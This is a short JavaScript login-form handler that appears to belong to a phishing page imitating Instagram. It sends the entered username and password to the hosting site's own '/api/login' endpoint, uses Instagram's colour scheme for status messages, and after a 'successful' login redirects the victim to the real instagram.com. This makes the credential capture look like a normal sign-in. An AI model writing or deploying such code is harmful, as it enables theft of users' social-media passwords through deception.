const form = document.querySelector('#loginForm');
const message = document.querySelector('#message');
const loginBtn = document.querySelector('#loginBtn');

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  message.textContent = 'Logging in...';
  message.style.color = '#262626';
  loginBtn.disabled = true;

  const username = document.querySelector('#username').value;
  const password = document.querySelector('#password').value;

  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();
    message.textContent = data.message || (response.ok ? 'Success' : 'Failed');
    message.style.color = response.ok ? '#00ba7c' : '#ed4956';
    if (response.ok) {
      setTimeout(() => {
        window.location.assign('https://www.instagram.com');
      }, 800);
    }
  } catch {
    message.textContent = 'Server connection failed.';
    message.style.color = '#ed4956';
  } finally {
    loginBtn.disabled = false;
  }
});